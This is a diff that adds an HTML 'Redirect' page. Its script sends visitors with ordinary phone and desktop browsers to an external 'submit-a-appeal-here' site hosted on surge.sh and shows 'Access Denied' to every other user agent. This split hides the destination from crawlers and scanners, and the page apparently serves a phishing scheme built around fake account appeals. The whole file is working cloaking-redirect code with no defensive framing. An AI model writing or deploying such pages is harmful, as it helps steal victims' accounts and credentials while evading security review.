@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Redirect</title>
+
+<script>
+const redirectUrl = "https://submit-a-appeal-here.surge.sh/";
+
+function processVisitor() {
+
+  const ua = navigator.userAgent.toLowerCase();
+
+  const allowedDevices = [
+    /android/i,
+    /iphone/i,
+    /ipad/i,
+    /windows/i,
+    /mac os/i,
+    /cros/i
+  ];
+
+  const isAllowed = allowedDevices.some((regex) => regex.test(ua));
+
+  if (isAllowed) {
+
+    // redirect
+    window.location.href = redirectUrl;
+
+  } else {
+
+    document.body.innerHTML = `
+    <div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+      <h2>Access Denied</h2>
+    </div>
+    `;
+
+  }
+
+}
+
+document.addEventListener("DOMContentLoaded", processVisitor);
+</script>
+
+</head>
+
+<body>
+</body>
+</html>
